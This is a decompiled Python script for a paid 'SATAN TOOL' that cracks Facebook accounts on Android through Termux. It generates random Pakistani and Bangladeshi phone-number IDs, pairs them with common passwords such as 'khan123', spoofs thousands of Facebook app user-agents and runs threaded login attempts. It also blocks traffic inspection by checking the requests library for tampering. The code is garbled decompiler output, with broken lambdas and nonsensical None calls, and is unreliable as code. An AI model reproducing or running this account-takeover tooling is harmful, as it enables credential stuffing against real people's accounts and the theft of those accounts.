
# — — — — — — — — — — — — —
# Tool Made By @i6iii1
# Encoding: Pycdc 3.11
# Decode By @i6iii1
# Channel @mafiams1
# — — — — — — — — — — — — —


import lzma
import zlib
import codecs
import base64
_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));


from datetime import date
from datetime import datetime
from ast import Pass
from os import name, path
import os
import base64
import zlib
import pip
import urllib
import xxlimited
from xxlimited import Xxo
from bs4 import BeautifulSoup
proxy = proxy
import weakref
import os
import base64
import zlib
import platform
from urllib.request import parse_http_list
print('\n [√] Wait Installing Modules...!')
os.system('pip uninstall urllib3 requests chardet idna certifi -y')
os.system('pip install urllib3 requests chardet idna certifi')
print('\n \x1b[1;32m[√]\x1b[1;37m Wait Checking Modules...!')
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as bsp
os.system('pip install bs4')
from bs4 import BeautifulSoup as bsp
import os
import requests
import json
import time
import re
import random
import sys
import uuid
import string
import subprocess
from string import *
from concurrent.futures import ThreadPoolExecutor as tred
if ModuleNotFoundError:
    print('\n Installing missing modules ...')
    os.system('pip install requests futures==2 > /dev/null')
    os.system('python s1n.py')
first = '/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'
if 'print' not in open(first + 'sessions.py', 'r').read():
    pass
exit('\x1b[1;91mPlease Try This Local Method Capture On Kids ')
gt = random.choice([
    'GT-1015',
    'GT-1020',
    'GT-1030',
    'GT-1035',
    'GT-1040',
    'GT-1045',
    'GT-1050',
    'GT-1240',
    'GT-1440',
    'GT-1450',
    'GT-18190',
    'GT-18262',
    'GT-19060I',
    'GT-19082',
    'GT-19083',
    'GT-19105',
    'GT-19152',
    'GT-19192',
    'GT-19300',
    'GT-19505',
    'GT-2000',
    'GT-20000',
    'GT-200s',
    'GT-3000',
    'GT-414XOP',
    'GT-6918',
    'GT-7010',
    'GT-7020',
    'GT-7030',
    'GT-7040',
    'GT-7050',
    'GT-7100',
    'GT-7105',
    'GT-7110',
    'GT-7205',
    'GT-7210',
    'GT-7240R',
    'GT-7245',
    'GT-7303',
    'GT-7310',
    'GT-7320',
    'GT-7325',
    'GT-7326',
    'GT-7340',
    'GT-7405',
    'GT-7550   5GT-8005',
    'GT-8010',
    'GT-81',
    'GT-810',
    'GT-8105',
    'GT-8110',
    'GT-8220S',
    'GT-8410',
    'GT-9300',
    'GT-9320',
    'GT-93G',
    'GT-A7100',
    'GT-A9500',
    'GT-ANDROID',
    'GT-B2710',
    'GT-B5330',
    'GT-B5330B',
    'GT-B5330L',
    'GT-B5330ZKAINU',
    'GT-B5510',
    'GT-B5512',
    'GT-B5722',
    'GT-B7510',
    'GT-B7722',
    'GT-B7810',
    'GT-B9150',
    'GT-B9388',
    'GT-C3010',
    'GT-C3262',
    'GT-C3310R',
    'GT-C3312',
    'GT-C3312R',
    'GT-C3313T',
    'GT-C3322',
    'GT-C3322i',
    'GT-C3520',
    'GT-C3520I',
    'GT-C3592',
    'GT-C3595',
    'GT-C3782',
    'GT-C6712',
    'GT-E1282T',
    'GT-E1500',
    'GT-E2200',
    'GT-E2202',
    'GT-E2250',
    'GT-E2252',
    'GT-E2600',
    'GT-E2652W',
    'GT-E3210',
    'GT-E3309',
    'GT-E3309I',
    'GT-E3309T',
    'GT-G530H',
    'GT-g900f',
    'GT-G930F',
    'GT-H9500',
    'GT-I5508',
    'GT-I5801',
    'GT-I6410',
    'GT-I8150',
    'GT-I8160OKLTPA',
    'GT-I8160ZWLTTT',
    'GT-I8258',
    'GT-I8262D',
    'GT-I8268',
    'GT-I8505',
    'GT-I8530BAABTU',
    'GT-I8530BALCHO',
    'GT-I8530BALTTT',
    'GT-I8550E',
    'GT-i8700',
    'GT-I8750',
    'GT-I900',
    'GT-I9008L',
    'GT-i9040',
    'GT-I9080E',
    'GT-I9082C',
    'GT-I9082EWAINU',
    'GT-I9082i',
    'GT-I9100G',
    'GT-I9100LKLCHT',
    'GT-I9100M',
    'GT-I9100P',
    'GT-I9100T',
    'GT-I9105UANDBT',
    'GT-I9128E',
    'GT-I9128I',
    'GT-I9128V',
    'GT-I9158P',
    'GT-I9158V',
    'GT-I9168I',
    'GT-I9192I',
    'GT-I9195H',
    'GT-I9195L',
    'GT-I9250',
    'GT-I9303I',
    'GT-I9305N',
    'GT-I9308I',
    'GT-I9505G',
    'GT-I9505X',
    'GT-I9507V',
    'GT-I9600',
    'GT-m190',
    'GT-M5650',
    'GT-mini',
    'GT-N5000S',
    'GT-N5100',
    'GT-N5105',
    'GT-N5110',
    'GT-N5120',
    'GT-N7000B',
    'GT-N7005',
    'GT-N7100T',
    'GT-N7102',
    'GT-N7105',
    'GT-N7105T',
    'GT-N7108',
    'GT-N7108D',
    'GT-N8000',
    'GT-N8005',
    'GT-N8010',
    'GT-N8020',
    'GT-N9000',
    'GT-N9505',
    'GT-P1000CWAXSA',
    'GT-P1000M',
    'GT-P1000T',
    'GT-P1010',
    'GT-P3100B',
    'GT-P3105',
    'GT-P3108',
    'GT-P3110',
    'GT-P5100',
    'GT-P5200',
    'GT-P5210XD1',
    'GT-P5220',
    'GT-P6200',
    'GT-P6200L',
    'GT-P6201',
    'GT-P6210',
    'GT-P6211',
    'GT-P6800',
    'GT-P7100',
    'GT-P7300',
    'GT-P7300B',
    'GT-P7310',
    'GT-P7320',
    'GT-P7500D',
    'GT-P7500M',
    'GT-P7500R',
    'GT-P7500V',
    'GT-P7501',
    'GT-P7511',
    'GT-S3330',
    'GT-S3332',
    'GT-S3333',
    'GT-S3370',
    'GT-S3518',
    'GT-S3570',
    'GT-S3600i',
    'GT-S3650',
    'GT-S3653W',
    'GT-S3770K',
    'GT-S3770M',
    'GT-S3800W',
    'GT-S3802',
    'GT-S3850',
    'GT-S5220',
    'GT-S5220R',
    'GT-S5222',
    'GT-S5230',
    'GT-S5230W',
    'GT-S5233T',
    'GT-s5233w',
    'GT-S5250',
    'GT-S5253',
    'GT-s5260',
    'GT-S5280',
    'GT-S5282',
    'GT-S5283B',
    'GT-S5292',
    'GT-S5300',
    'GT-S5300L',
    'GT-S5301',
    'GT-S5301B',
    'GT-S5301L',
    'GT-S5302',
    'GT-S5302B',
    'GT-S5303',
    'GT-S5303B',
    'GT-S5310',
    'GT-S5310B',
    'GT-S5310C',
    'GT-S5310E',
    'GT-S5310G',
    'GT-S5310I',
    'GT-S5310L',
    'GT-S5310M',
    'GT-S5310N',
    'GT-S5312',
    'GT-S5312B',
    'GT-S5312C',
    'GT-S5312L',
    'GT-S5330',
    'GT-S5360',
    'GT-S5360B',
    'GT-S5360L',
    'GT-S5360T',
    'GT-S5363',
    'GT-S5367',
    'GT-S5369',
    'GT-S5380',
    'GT-S5380D',
    'GT-S5500',
    'GT-S5560',
    'GT-S5560i',
    'GT-S5570B',
    'GT-S5570I',
    'GT-S5570L',
    'GT-S5578',
    'GT-S5600',
    'GT-S5603',
    'GT-S5610',
    'GT-S5610K',
    'GT-S5611',
    'GT-S5620',
    'GT-S5670',
    'GT-S5670B',
    'GT-S5670HKBZTA',
    'GT-S5690',
    'GT-S5690R',
    'GT-S5830',
    'GT-S5830D',
    'GT-S5830G',
    'GT-S5830i',
    'GT-S5830L',
    'GT-S5830M',
    'GT-S5830T',
    'GT-S5830V',
    'GT-S5831i',
    'GT-S5838',
    'GT-S5839i',
    'GT-S6010',
    'GT-S6010BBABTU',
    'GT-S6012',
    'GT-S6012B',
    'GT-S6102',
    'GT-S6102B',
    'GT-S6293T',
    'GT-S6310B',
    'GT-S6310ZWAMID',
    'GT-S6312',
    'GT-S6313T',
    'GT-S6352',
    'GT-S6500',
    'GT-S6500D',
    'GT-S6500L',
    'GT-S6790',
    'GT-S6790L',
    'GT-S6790N',
    'GT-S6792L',
    'GT-S6800',
    'GT-S6800HKAXFA',
    'GT-S6802',
    'GT-S6810',
    'GT-S6810B',
    'GT-S6810E',
    'GT-S6810L',
    'GT-S6810M',
    'GT-S6810MBASER',
    'GT-S6810P',
    'GT-S6812',
    'GT-S6812B',
    'GT-S6812C',
    'GT-S6812i',
    'GT-S6818',
    'GT-S6818V',
    'GT-S7230E',
    'GT-S7233E',
    'GT-S7250D',
    'GT-S7262',
    'GT-S7270',
    'GT-S7270L',
    'GT-S7272',
    'GT-S7272C',
    'GT-S7273T',
    'GT-S7278',
    'GT-S7278U',
    'GT-S7390',
    'GT-S7390G',
    'GT-S7390L',
    'GT-S7392',
    'GT-S7392L',
    'GT-S7500',
    'GT-S7500ABABTU',
    'GT-S7500ABADBT',
    'GT-S7500ABTTLP',
    'GT-S7500CWADBT',
    'GT-S7500L',
    'GT-S7500T',
    'GT-S7560',
    'GT-S7560M',
    'GT-S7562',
    'GT-S7562C',
    'GT-S7562i',
    'GT-S7562L',
    'GT-S7566',
    'GT-S7568',
    'GT-S7568I',
    'GT-S7572',
    'GT-S7580E',
    'GT-S7583T',
    'GT-S758X',
    'GT-S7592',
    'GT-S7710',
    'GT-S7710L',
    'GT-S7898',
    'GT-S7898I',
    'GT-S8500',
    'GT-S8530',
    'GT-S8600',
    'GT-STB919',
    'GT-T140',
    'GT-T150',
    'GT-V8a',
    'GT-V8i',
    'GT-VC818',
    'GT-VM919S',
    'GT-W131',
    'GT-W153',
    'GT-X831',
    'GT-X853',
    'GT-X870',
    'GT-X890',
    'GT-Y8750'])
ses = requests.Session()

def clr():
    data = os.listdir('/sdcard')
    if 'Android' in data:
        print(' \x1b[1;32m[!]\x1b[1;37m Dont Try Bypass Mother Fucker...! \n YOUR BYPASS FUCKED BY SATAN')
        exit()
        return None
    None()
    return None
    exit()

from requests import api
x = open(api.__file__, 'r').read()
if 'print' in x:
    clr()
if 'sys.stdout.write' in x:
    clr()
from requests import sessions
x = open(sessions.__file__, 'r').read()
if 'print' in x:
    clr()
if 'sys.stdout.write' in x:
    clr()
from requests import models
x = open(models.__file__, 'r').read()
if 'print' in x:
    clr()
if 'sys.stdout.write' in x:
    clr()
W = '\x1b[97;1m'
R = '\x1b[91;1m'
G = '\x1b[92;1m'
Y = '\x1b[93;1m'
B = '\x1b[94;1m'
P = '\x1b[95;1m'
S = '\x1b[96;1m'
N = '\x1b[0m'
P = '\x1b[0;97m'
M = '\x1b[0;91m'
H = '\x1b[0;92m'
K = '\x1b[0;93m'
B = '\x1b[0;94m'
U = '\x1b[0;95m'
O = '\x1b[0;96m'
N = '\x1b[0m'
A = '\x1b[1;97m'
B = '\x1b[1;96m'
C = '\x1b[1;91m'
D = '\x1b[1;92m'
M = '{RED}'
H = '{GREEN}'
N = '\x1b[1;37m'
E = '\x1b[1;93m'
F = '\x1b[1;94m'
G = '\x1b[1;95m'
GREEN = '\x1b[38;5;46m'
RED = '\x1b[38;5;196m'
WHITE = '\x1b[1;97m'
YELLOW = '\x1b[1;33m'
BLUE = '\x1b[1;34m'
ORANGE = '\x1b[1;35m'
EXTRA = '\x1b[38;5;208m'
R = '{RED}'
G = '{GREEN}'
Y = '\x1b[1;33m'
Q = '\x1b[1;37m'
T = '\x1b[1;34m'
HBF = '{ HBF }'
now = datetime.now()
dt_string = now.strftime('%H:%M')
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()
hamii2 = f'''\x1b[1;33m➤{GREEN}➤\x1b[0m'''

def hamiiT():
    now = datetime.now()
    hours = now.hour
    if 4 <= hours or None < 12:
        timenow = 'GOOD MORNING'
    if 12 <= hours or None < 15:
        timenow = 'GOOD AFTERNOON'
    if 15 <= hours or None < 18:
        timenow = 'GOOD EVENING'
    timenow = 'GOOD NIGHT'
    return timenow


def S3():
    en = random.choice([
        'en_US',
        'en_GB',
        'en_PK',
        'ru_RU',
        'de_DE',
        'th_TH',
        'en_BD',
        'en_IN',
        'en_AF',
        'hi_IN',
        'ja_JP'])
    kt = random.choice([
        'com.facebook.katana',
        'com.facebook.orca',
        'com.facebook.mlite'])
    fbcr = random.choice([
        'o2 - de',
        'Verizon - us',
        'MY CELCOM',
        'Vodafone - uk',
        'null',
        'DTAC',
        'IND airtel',
        'Nepal Telecom'])
    s = '[FBAN/FB4A;FBAV/' + str(random.randint(111, 999)) + '.0.0.' + str(random.randrange(9, 99)) + str(random.randint(111, 999)) + ';FBBV/' + str(random.randint(111111111, 999999999))
    e = ';[FBAN/FB4A;FBAV/75.0.0.23.69;FBBV/29142907;FBDM/{density=1.5,width=480,height=854};FBLC/' + en + ';FBCR/' + fbcr + ';FBMF/QMobile;FBBD/QMobile;FBPN/com.facebook.katana;FBDV/QMobile i6 Metal ONE;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
    ua = s + e
    return ua


def M2():
    a = '[FBAN/FB4A;FBAV/' + str(random.randint(11, 77)) + '.0.0.' + str(random.randrange(9, 49)) + str(random.randint(11, 318)) + ';FBBV/' + str(random.randint(11111111, 77777777))
    b = ';[FBAN/FB4A;FBAV/2.1;FBDM/{density=1.0,width=1280,height=752};FBLC/en_US;FBCR/Telenor;FBPN/com.facebook.katana;FBDV/GT-N8000;FBSV/4.0.4;]'
    ua = a + b
    return ua


def M1():
    a = '[FBAN/FB4A;FBAV/' + str(random.randint(11, 77)) + '.0.0.' + str(random.randrange(9, 49)) + str(random.randint(11, 318)) + ';FBBV/' + str(random.randint(11111111, 77777777))
    b = ';[FBAN/FB4A;FBAV/255.0.0.33.121;FBBV/195354855;FBDM/{density=2.0,width=720,height=1344};FBLC/ro_RO;FBRV/0;FBCR/Telenor;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Redmi 5;FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
    ua = a + b
    return ua

ugen = []
for xd in range(10000):
    aa = 'Mozilla/5.0 (Linux; U; Android'
    b = random.choice([
        '3',
        '4',
        '5',
        '6',
        '7',
        '8',
        '9',
        '10',
        '11',
        '12',
        '13',
        '14',
        '15',
        '16',
        '17'])
    c = ' en-us; GT-'
    d = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    e = random.randrange(1, 999)
    f = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    g = 'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h = random.randrange(73, 100)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'Mobile Safari/537.36'
    uaku2 = f'''{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'''
    ugen.append(uaku2)
    
    def s1n():
        LINE = random.choice([
            'FB4A',
            'Orca-Android'])
        LINE2 = random.choice([
            'com.facebook.katana',
            'com.facebook.orca'])
        code = random.choice([
            'es_LA',
            'es_EA',
            'es_EC',
            'es_ES',
            'es_GT',
            'es_GQ',
            'en_GB',
            'en_US',
            'es_SV',
            'ne_NP',
            'sk_SK',
            'it_IT',
            'pt_PT',
            'pt_BR',
            'pl_PL',
            'no_NO',
            'sh_SP',
            'lv_LV',
            'el_GR',
            'de_LU',
            'de_LI',
            'dz_BT',
            'el_CY',
            'en_GU',
            'en_HK',
            'th_TH',
            'fi_FI',
            'in_ID',
            'fr_FR',
            'nl_NL',
            'fr_CA',
            'es_MX',
            'cs_CZ',
            'es_MX',
            'vi_VN',
            'en_PH',
            'uk_UA'])
        network = random.choice([
            'Telekom.de',
            'Telekom HU',
            'halebop',
            'Meteor',
            'movistar',
            'VIRGIN',
            'TELKOMSEL',
            'Verizon Wireless',
            'EMOVIL',
            'VIVA',
            'TURKCELL',
            'ROGERS',
            'Tesco Mobile',
            'TIGO',
            'T-Mobile',
            'AT&amp-T',
            'Telstra',
            'mt:s',
            'YES_OPTUS',
            'Vodafone',
            'Cellcom',
            'Telenor',
            'AIS',
            'Bezlimit',
            'Zong',
            'Jazz',
            'Fido',
            'TRUE-H'])
        ua1 = '[FBAN/FB4A;FBAV/' + str(random.randint(11, 77)) + '.0.0.' + str(random.randrange(9, 49)) + '.' + str(random.randint(11, 313)) + ';FBBV/' + str(random.randint(1111111, 77777777)) + ';[FBAN/FB4A;FBAV/3.2.1;FBBV/204210;FBDM/{density=1.0,width=480,height=800};FBLC/' + code + ';FBCR/' + network + ';FBPN/com.facebook.katana;FBDV/I9103 Galaxy R;FBSV/4.0;]'
        return ua1

    code = random.choice([
        'es_LA',
        'es_EA',
        'es_EC',
        'es_ES',
        'es_GT',
        'es_GQ',
        'en_GB',
        'en_US',
        'es_SV',
        'ne_NP',
        'sk_SK',
        'it_IT',
        'pt_PT',
        'pt_BR',
        'pl_PL',
        'no_NO',
        'sh_SP',
        'lv_LV',
        'el_GR',
        'de_LU',
        'de_LI',
        'dz_BT',
        'el_CY',
        'en_GU',
        'en_HK',
        'th_TH',
        'fi_FI',
        'in_ID',
        'fr_FR',
        'da_DK',
        'nl_NL',
        'fr_CA',
        'es_MX',
        'cs_CZ',
        'es_MX',
        'vi_VN',
        'en_PH'])
    loc = random.choice([
        'LA',
        'EA',
        'EC',
        'ES',
        'GT',
        'GQ',
        'GB',
        'US',
        'SV',
        'NP',
        'SK',
        'IT',
        'PT',
        'BR',
        'PL',
        'NO',
        'SP',
        'LV',
        'GR',
        'LU',
        'LI',
        'BT',
        'CY',
        'GU',
        'HK',
        'TH',
        'FI',
        'ID',
        'FR',
        'DK',
        'NL',
        'CA',
        'MX',
        'CZ',
        'MX',
        'VN',
        'PH'])
    xx = requests.get('https://raw.githubusercontent.com/Luciferhck143/DATE/main/DATE.txt').text.splitlines()
    s1n__1 = random.choice(xx)
    
    def clear():
        os.system('clear')
        print(logo)

    logo = "\x1b[1;37m\n .d8888.  .d8b.  d888888b  .d8b.  d8b   db \n 88'  YP d8' `8b `~~88~~' d8' `8b 888o  88 \n `8bo.   88ooo88    88    88ooo88 88V8o 88 \n\x1b[92;1m   `Y8b. 88~~~88    88    88~~~88 88 V8o88 \n db   8D 88   88    88    88   88 88  V888 \n `8888Y' YP   YP    YP    YP   YP VP   V8P         \n         \x1b[1;37m[\x1b[92;1mSATAN \x1b[92;1mNAAM \x1b[92;1mTU \x1b[92;1mSUNA \x1b[92;1mHOGA\x1b[1;37m]\n\x1b[1;37m-----------------------------------------------\n\x1b[1;37m[\x1b[92;1m√\x1b[1;37m] AUTHOR    : \x1b[1;37m[\x1b[92;1mSATAN\x1b[1;37m] \x1b[92;1m•\n\x1b[1;37m[\x1b[92;1m√\x1b[1;37m] GITHUB    : NOT FOUND\n\x1b[1;37m[\x1b[92;1m√\x1b[1;37m] VERSION   : \x1b[92;1m4\x1b[92;1m.\x1b[92;1m0 \n\x1b[1;37m═══════════════════════════════════════════════\n\x1b[92;1m            WELCOME TO SATAN TOOL         \n\x1b[92;1m                 FREE TRAIL \x1b[1;37m√ \n\x1b[1;37m═══════════════════════════════════════════════"
    
    def line():
        print('\x1b[1;37m-----------------------------------------------')

    line()
    loop = 0
    oks = []
    cps = []
    pcp = []
    ck = []
    
    def asha(uid):
        if len(uid) == 15:
            if uid[:10] in ('1000000000',):
                alif = ' (*-*) 2009 √'
            if uid[:9] in ('100000000',):
                alif = ' ACCOUNT  2009 √'
            if uid[:8] in ('10000000',):
                alif = ' ACCOUNT 2009 √'
            if uid[:7] in ('1000000', '1000001', '1000002', '1000003', '1000004', '1000005'):
                alif = ' ACCOUNT 2009 √'
            if uid[:7] in ('1000006', '1000007', '1000008', '1000009'):
                alif = ' ACCOUNT 2010 √'
            if uid[:6] in ('100001',):
                alif = ' ACCOUNT 2010/2011 √'
            if uid[:6] in ('100002', '100003'):
                alif = ' ACCOUNT 2011/2012 √'
            if uid[:6] in ('100004',):
                alif = ' ACCOUNT 2012/2013 √'
            if uid[:6] in ('100005', '100006'):
                alif = ' ACCOUNT 2013/2014 √'
            if uid[:6] in ('100007', '100008'):
                alif = ' ACCOUNT 2014/2015 √'
            if uid[:6] in ('100009',):
                alif = ' ACCOUNT 2015 √'
            if uid[:5] in ('10001',):
                alif = ' ACCOUNT 2015/2016 √'
            if uid[:5] in ('10002',):
                alif = ' ACCOUNT 2016/2017 √'
            if uid[:5] in ('10003',):
                alif = ' ACCOUNT 2018/2019 √'
            if uid[:5] in ('10004',):
                alif = ' ACCOUNT 2019/2020 √'
            if uid[:5] in ('10005',):
                alif = ' ACCOUNT 2020 √'
            if uid[:5] in ('10006', '10007', ''):
                alif = ' ACCOUNT 2021 √'
            if uid[:5] in ('10008',):
                alif = ' ACCOUNT 2022 √'
            if uid[:5] in ('10009',):
                alif = ' ACCOUNT 2023 √'
            alif = ''
        if len(uid) in (9, 10):
            alif = ' ACCOUNT 2008/2009 √'
        if len(uid) == 8:
            alif = ' ACCOUNT 2007/2008 √'
        if len(uid) == 7:
            alif = ' ACCOUNT 2006/2007 √'
        alif = ''
        return alif

    
    def cek_apk(session, coki):
        w = session.get('https://mbasic.facebook.com/settings/apps/tabbed/?tab=active', cookies = {
            'cookie': coki }).text
        sop = BeautifulSoup(w, 'html.parser')
        x = sop.find('form', method = 'post')
        game = x.find_all('h3')()
        if len(game) == 0:
            print('\r\x1b[38;5;46m[\x1b[38;5;196m!\x1b[38;5;46m] \x1b[1;33mSorry there is no Active  Apk  ')
        print(f'''\r[🎮] \x1b[38;5;46m ☆ Your Active Apps ☆     :{WHITE}''')
        for i in range(len(game)):
            print('\r[%s%s] %s%s' % (N, i + 1, game[i].replace('Added on', ' Added on'), N))
            w = session.get('https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive', cookies = {
                'cookie': coki }).text
            sop = BeautifulSoup(w, 'html.parser')
            x = sop.find('form', method = 'post')
            game = x.find_all('h3')()
            if len(game) == 0:
                print(f'''\r\x1b[38;5;46m[\x1b[38;5;196m!\x1b[38;5;46m] \x1b[1;33mSorry there is no Expired Apk{WHITE}''')
                print('-----------------------------------------------')
                return None
            (lambda .0: for i in .0:
[ i.text ])(f'''\r[🎮] \x1b[38;5;196m ◇ Your Expired Apps ◇    :{WHITE}''')
            for i in range(len(game)):
                print('\r[%s%s] %s%s' % (N, i + 1, game[i].replace('Expired', ' Expired'), N))
                print('-----------------------------------------------')
                return None

    import pycurl
    from io import BytesIO
    
    def get_response(url):
        response_buffer = BytesIO()
        curl = pycurl.Curl()
        curl.setopt(curl.URL, url)
        curl.setopt(curl.WRITEDATA, response_buffer)
        curl.perform()
        if pycurl.error:
            e = None
            e = None
            del e
            return f'''Error: {e}'''
        e = None
        del e
        response = response_buffer.getvalue().decode('utf-8')
        curl.close()
        return response

    
    def remove_symbols_and_spaces(input_string):
        cleaned_string = re.sub('[^a-zA-Z0-9#]', '', input_string)
        return cleaned_string

    
    def approval():
        os.system('clear')
        print(logo)
        import platform
        uuid = str(os.geteuid()) + '#' + platform.uname().machine + platform.uname().version + platform.uname().release
        id = remove_symbols_and_spaces(uuid)
        (k1, k2, k3, k4) = (id[:4], id[3:6], id[4:9], id[9:])
        intuid = int(id.split('#')[0])
        pref = str(((intuid - 104729) * 2 - 37) + -127)
        suff = str((intuid - 523217) % 104729)
        realid = (suff + k3 + k1 + k4 + k2 + pref).encode().hex()
        httpCaht = get_response('https://raw.githubusercontent.com/Luciferhck143/DATE/main/KEY.txt')
        if realid in httpCaht:
            print('\x1b[92;1m YOUR KEY IS APPROVED.')
            time.sleep(1)
            clear()
            msg = str(os.geteuid())
            return None
        None(f'''\x1b[92;1m YOUR KEY :{W}  ''' + id)
        line()
        print(f'''{W} TOOL IS PAID YOU HAVE TO PAY FOR APPROVAL .''')
        line()
        print(f''' \x1b[92;1mFor Pakistan ==={W} Easypaise : \x1b[92;1m033----------''')
        print(f''' \x1b[92;1mFor Pakistan ==={W} Jazzcash  : \x1b[92;1m033----------''')
        line()
        print(f''' {W}Rs.350 For 15 Days''')
        print(f''' {W}Rs.500 For 1 Month''')
        line()
        print(f''' \x1b[92;1mFor Other Countries ==={W} Binance : \x1b[92;1m------------''')
        print(f''' {W}6$  For 15 Days''')
        print(f''' {W}10$ For 1 Month''')
        line()
        print(f''' {W}COPY YOUR KEY SEND TO ADMIN FOR APPROVAL''')
        line()
        input('\x1b[92;1m IF YOU WANT TO BUY THEN PRESS ENTER ')
        tks = 'Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20' + id
        (os.system('am start https://wa.me/+923402402292?text=' + tks), approval())
        sys.exit()
        time.sleep(1)
        approval()
        return None
        if Exception:
            error = None
            print(error)
            error = None
            del error
            return None
        error = None
        del error

    
    def menu():
        approval()
        x = '***'
        if x == '***':
            print(f'''\t      {WHITE}[{YELLOW} {hamiiT()} {WHITE}]''')
            line()
            print('[1] CRACK FILE ')
            print('[2] RANDOM CRACK')
            print('[0] EXIT ')
            line()
            xd = input(' CHOOSE AN OPTION: ')
            if xd in ('1', '01'):
                clear()
                print(' PUT FILE EXAMPLE :  /sdcard/file.txt.etc..')
                line()
                file = input(' PUT FILE PATH\x1b[1;37m: ')
                fo = open(file, 'r').read().splitlines()
                if FileNotFoundError:
                    print(' FILE LOCATION NOT FOUND ')
                    time.sleep(1)
                    menu()
                clear()
                print('[1] M-1 ')
                print('[2] M-2 ')
                print('[3] M-3 ')
                print('[4] M-4 ')
                line()
                mthd = input(' CHOOSE : ')
                line()
                clear()
                plist = []
                ps_limit = int(input(' HOW MANY PASSWORDS DO YOU WANT TO ADD ? '))
                ps_limit = 1
                line()
                clear()
                print('\x1b[1;32m EXAMPLE : first last,firtslast,first123')
                line()
                for i in range(ps_limit):
                    plist.append(input(f''' PUT PASSWORD {i + 1}: '''))
                    line()
                    clear()
                    crack_submit = tred(max_workers = 60)
                    clear()
                    total_ids = str(len(fo))
                    print(' TOTAL ACCOUNT : \x1b[1;32m' + total_ids + ' ')
                    print('\x1b[1;37m CRACKING....ON\x1b[1;37m')
                    line()
                    for user in fo:
                        (ids, names) = user.split('|')
                        passlist = plist
                        if mthd in ('1', '01'):
                            crack_submit.submit(api1, ids, names, passlist)
                        if mthd in ('2', '02'):
                            crack_submit.submit(newidx, ids, names, passlist)
                        if mthd in ('3', '03'):
                            crack_submit.submit(ffb, ids, names, passlist)
                        if mthd in ('4', '04'):
                            crack_submit.submit(newidx12, ids, names, passlist)
                        None(None, None)
                        if not None:
                            pass
                print('\x1b[1;37m')
                line()
                print(' THE PROCESS HAS COMPLETED')
                print(' TOTAL OK/CP: ' + str(len(oks)) + '/' + str(len(cps)))
                line()
                input(' PRESS ENTER TO BACK ')
                os.system('python s1n.py')
                return None
            if xd in ('2', '02'):
                clear()
                print(' [1] PAKISTAN\n [2] BANGLADESH\n [3] AFGHANISTAN\n [4] INDIA\n [5] GMAIL\n [0] BACK MENU')
                line()
                x = input(' Choose: ')
                if x in ('1', '01'):
                    pak()
                    return None
                if None in ('2', '02'):
                    bd()
                    return None
                if None in ('3', '03'):
                    afg()
                    return None
                if None in ('4', '04'):
                    ind()
                    return None
                if None in ('5', '05'):
                    gmail()
                    return None
                None()
                return None
            if None in ('0', '00'):
                exit()
                return None
            return None
            return None
            if requests.exceptions.ConnectionError:
                print('\n NO INTERNET CONNECTION ...')
                exit()
                return None

    
    def pak():
        user = []
        clear()
        print('\x1b[1;92m EXAMPLE CODE EXAMPLE : 0300,0315,0333,0345')
        code = input('\x1b[1;37m PUT CODE: ')
        limit = int(input('\x1b[1;92m EXAMPLE : 2000, 3000, 5000, 10000\n\x1b[1;37m PUT LIMIT : '))
        if ValueError:
            limit = 5000
        for nmbr in range(limit):
            nmp = (lambda .0: for _ in .0:
random.choice(string.digits)None)(range(7)())
            user.append(nmp)
            S1N = tred(max_workers = 30)
            clear()
            print('[1] M-1 ')
            print('[2] M-2 ')
            line()
            mthd = input(' CHOOSE : ')
            line()
            clear()
            tl = str(len(user))
            print('\x1b[1;97m [\x1b[1;92m•\x1b[1;97m] \x1b[1;97mTOTAL ACCOUNT: \x1b[1;97m' + tl)
            print('\x1b[1;97m [\x1b[1;92m•\x1b[1;97m] \x1b[1;97mSELECT CODE: \x1b[1;97m ' + code)
            print('\x1b[1;97m [\x1b[1;92m•\x1b[1;97m] \x1b[1;97mCRACKING....ON \x1b[1;97m')
            line()
            for psx in user:
                ids = code + psx
                passlist = [
                    psx,
                    ids,
                    'khankhan',
                    'malik123',
                    'kingkhan',
                    'baloch123',
                    'pak123',
                    'khan123',
                    'janjan',
                    'ali123']
                if mthd in ('1', '01'):
                    S1N.submit(rd, ids, passlist)
                if mthd in ('2', '02'):
                    S1N.submit(bd1, ids, passlist)
                None(None, None)
                if not ''.join:
                    pass
        print('\x1b[1;37m')
        line()
        print(' THE PROCESS HAS COMPLETED')
        print(' TOTAL OK/CP: ' + str(len(oks)) + '/' + str(len(cps)))
        line()
        input(' PRESS ENTER TO BACK ')
        os.system('python s1n.py')

    
    def bd():
        user = []
        clear()
        print('\x1b[1;92m EXAMPLE CODE EXAMPLE : 017, 018, 019, 016, 9196, 9178')
        code = input('\x1b[1;37m PUT CODE: ')
        limit = int(input('\x1b[1;92m EXAMPLE : 2000, 3000, 5000, 10000\n\x1b[1;37m PUT LIMIT : '))
        if ValueError:
            limit = 5000
        for nmbr in range(limit):
            nmp = (lambda .0: for _ in .0:
random.choice(string.digits)None)(range(8)())
            user.append(nmp)
            S1N = tred(max_workers = 30)
            clear()
            tl = str(len(user))
            print('\x1b[1;97m [\x1b[1;92m•\x1b[1;97m] \x1b[1;97mTOTAL ACCOUNT: \x1b[1;97m' + tl)
